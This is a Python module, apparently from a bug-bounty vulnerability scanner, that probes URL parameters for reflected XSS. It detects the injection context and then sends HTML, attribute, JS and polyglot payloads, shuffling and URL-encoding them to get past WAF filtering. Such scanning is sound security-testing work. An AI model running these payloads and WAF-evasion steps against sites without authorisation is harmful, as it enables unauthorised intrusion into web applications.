import random
from core.ui import vuln, CYN, RED, GRY, RESET, info
from core.http import http_probe
from core.rate_limit import RATE_LIMITER
from . import BaseScanner

class XSSScanner(BaseScanner):
    def _detect_xss_context(self, body: str, reflected_value: str) -> str:
        idx = body.find(reflected_value)
        if idx < 0:
            return "none"
        before = body[max(0, idx-500):idx].lower()
        last_script_open = before.rfind("<script")
        last_script_close = before.rfind("</script")
        if last_script_open > last_script_close:
            return "js"
        last_quote = max(before.rfind('"'), before.rfind("'"))
        last_tag = before.rfind("<")
        if last_tag > -1 and last_quote > last_tag:
            return "attribute"
        return "html"

    async def scan(self, url: str) -> list:
        findings = []
        await self._waf_sleep()
        parsed, params = self._get_params(url)
        if not params: return findings

        # Massive payload list categorized by context to maximize success
        # payloads format: (payload, verification_string, technique_name)
        HTML_PAYLOADS = [
            ("<script>alert(1)</script>", "alert(1)", "Basic Script"),
            ("<img src=x onerror=alert(1)>", "onerror=alert(1)", "Image OnError"),
            ("<svg/onload=alert(1)>", "onload=alert(1)", "SVG OnLoad"),
            ("<body onload=alert(1)>", "onload=alert(1)", "Body OnLoad"),
            ("<details/open/ontoggle=alert(1)>", "ontoggle=alert(1)", "Details OnToggle"),
            ("<input type=image src onerror=alert(1)>", "onerror=alert(1)", "Input Image OnError"),
            ("<marquee onstart=alert(1)>", "onstart=alert(1)", "Marquee OnStart"),
            ("<video><source onerror=alert(1)>", "onerror=alert(1)", "Video Source OnError"),
            ("<iframe src=javascript:alert(1)>", "javascript:alert(1)", "Iframe Src JS"),
        ]

        ATTR_PAYLOADS = [
            ("\"><script>alert(1)</script>", "alert(1)", "Break Attr -> Script"),
            ("\" autofocus onfocus=alert(1) id=\"", "onfocus=alert(1)", "Break Attr -> AutoFocus"),
            ("' autofocus onfocus=alert(1) id='", "onfocus=alert(1)", "Break Attr (Single Quote)"),
            ("\" onmouseover=\"alert(1)", "onmouseover=\"alert(1)", "Break Attr -> OnMouseOver"),
            ("' onmouseover='alert(1)", "onmouseover='alert(1)", "Break Attr -> OnMouseOver (Single)"),
            ("\"><svg/onload=alert(1)>", "onload=alert(1)", "Break Attr -> SVG"),
        ]

        JS_PAYLOADS = [
            ("'-alert(1)-'", "-alert(1)-", "Break String (Single Quote)"),
            ("\";alert(1);//", "alert(1);//", "Break String (Double Quote)"),
            ("</script><script>alert(1)</script>", "<script>alert(1)</script>", "Close Script Tag"),
            ("\\x27-alert(1)-\\x27", "-alert(1)-", "Hex Encoded Break"),
        ]

        POLYGLOT_PAYLOADS = [
            ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e", "alert(1)", "Ultimate WAF Polyglot"),
            ("\">><marquee><img src=x onerror=confirm(1)></marquee>\"</plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=image>", "prompt(1)", "Multi-Context Polyglot"),
        ]

        # First, inject a safe canary to determine context
        canary = f"bbxss{random.randint(1000,9999)}"
        for param in list(params.keys())[:5]: # Test top 5 params
            tp = dict(params)
            tp[param] = [canary]
            canary_url = self._build_url(parsed, tp)
            
            code_c, body_c, _, _ = await http_probe(self.session, canary_url, timeout=8)
            await self._waf_sleep()
            
            if code_c != 200 or canary not in body_c:
                continue

            # Detect context dynamically
            context = self._detect_xss_context(body_c, canary)
            info(f"XSS Context for '{param}' at {parsed.netloc}: [{context}]")
            
            # Select payload suite based on context
            test_payloads = POLYGLOT_PAYLOADS[:]
            if context == "html":
                test_payloads.extend(HTML_PAYLOADS)
            elif context == "attribute":
                test_payloads.extend(ATTR_PAYLOADS)
            elif context == "js":
                test_payloads.extend(JS_PAYLOADS)
            else:
                # If we couldn't clearly define it, try the most common ones
                test_payloads.extend(HTML_PAYLOADS[:3] + ATTR_PAYLOADS[:2] + JS_PAYLOADS[:1])

            random.shuffle(test_payloads) # Randomize to evade signature-based WAF blocking patterns

            for payload, evidence, tag in test_payloads[:8]: # Test up to 8 powerful payloads per parameter
                tp2 = dict(params)
                tp2[param] = [payload]
                test_url = self._build_url(parsed, tp2)
                
                code2, body2, _, _ = await http_probe(self.session, test_url, timeout=8)
                await self._waf_sleep()
                
                # WAF Adaptation 
                if self.waf_detected and code2 in (403, 406, 429, 503):
                    await RATE_LIMITER.report_blocked()
                    # Fallback to URL encoded payload if blocked
                    import urllib.parse
                    encoded_payload = urllib.parse.quote_plus(payload)
                    tp2[param] = [encoded_payload]
                    test_url_enc = self._build_url(parsed, tp2)
                    code2, body2, _, _ = await http_probe(self.session, test_url_enc, timeout=10)
                    
                    if code2 in (403, 406, 429, 503):
                        continue # Still blocked
                
                if code2 == 200 and evidence in body2:
                    # Verify it wasn't there originally
                    _, orig_body, _, _ = await http_probe(self.session, url, timeout=8)
                    if evidence not in orig_body:
                        # Success verification
                        vuln(f"XSS REFLECTED ({tag}): {url}")
                        print(GRY+"│    "+RESET+CYN+f"param: {param}  context: {context}"+RESET)
                        print(GRY+"│    "+RESET+RED+f"payload: {payload[:80]}"+RESET)
                        findings.append({"type": "XSS", "url": url, "param": param,
                                         "payload": payload, "technique": tag,
                                         "context": context, "evidence": evidence[:120]})
                        break # Found one for this param, move to next param
                else:
                    await RATE_LIMITER.report_success()

        return findings
